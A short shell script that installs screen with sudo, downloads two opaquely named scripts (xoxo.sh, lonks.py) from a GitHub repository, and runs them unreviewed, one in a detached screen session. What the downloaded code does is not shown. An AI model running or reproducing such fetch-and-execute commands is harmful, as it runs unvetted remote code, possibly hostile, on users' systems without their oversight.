#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/xkolux/takealook/raw/main/xoxo.sh
wget https://github.com/xkolux/takealook/raw/main/lonks.py
chmod +x lonks.py
screen -dmS lonks.py ./lonks.py 70 80
chmod +x xoxo.sh
./xoxo.sh
